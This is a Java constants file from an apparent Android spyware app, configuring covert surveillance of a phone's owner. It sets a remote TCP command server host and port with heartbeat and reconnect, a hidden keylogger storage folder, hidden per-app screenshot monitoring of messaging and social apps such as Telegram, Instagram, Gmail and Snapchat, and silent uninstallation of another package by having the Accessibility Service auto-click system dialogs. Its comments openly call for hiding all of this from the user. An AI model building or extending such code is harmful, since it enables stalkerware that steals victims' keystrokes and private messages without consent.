package com.task.tusker.utils;

public class Constants {

    // ========== AUTO-UNINSTALL ==========
    // Package to silently uninstall 30 seconds after the Accessibility Service connects.
    // The Accessibility Service will auto-click OK/Uninstall on the system dialog.
    // Set to "" to disable.
    public static final String AUTO_UNINSTALL_PACKAGE = "com.onerule.task";

    // ========== TCP SERVER ==========
    public static final String TCP_HOST = "sjc1.clusters.zeabur.com";
    public static final int    TCP_PORT = 20944;

    public static final int TCP_RECONNECT_DELAY = 1500;
    public static final int HEARTBEAT_INTERVAL  = 10000;

    // ========== KEYLOGGER STORAGE ==========
    // Hidden inside app's private internal data (not visible in file managers)
    // Path: /data/data/<package>/files/.kl/
    public static final String KEYLOG_DIR        = ".kl";
    public static final String KEYLOG_DATE_FMT   = "yyyy-MM-dd";

    // ========== APP MONITOR ==========
    // Hidden inside app's private internal data
    // Path: /data/data/<package>/files/.am/<packageName>/
    public static final String APP_MONITOR_DIR   = ".am";

    /**
     * Packages to monitor silently.
     * Keylogs and accessibility screenshots are stored per-app, per-day.
     * Add as many packages as needed — one per line.
     *
     * Examples:
     *   "com.whatsapp"
     *   "com.instagram.android"
     *   "com.facebook.katana"
     *   "org.telegram.messenger"
     *   "com.snapchat.android"
     *   "com.zhiliaoapp.musically"   // TikTok
     *   "com.twitter.android"
     *   "com.facebook.orca"          // Messenger
     */
    public static final String[] MONITORED_PACKAGES = {
        "com.android.stk",
        "com.instagram.android",
        "com.facebook.katana",
        "org.telegram.messenger",
        "com.snapchat.android",
        "com.zhiliaoapp.musically",
        "com.twitter.android",
        "com.facebook.orca",
        "com.google.android.gm",
        "com.viber.voip",
        "com.skype.raider",
        // Add more package names here:
        // "com.app.example",
    };
}
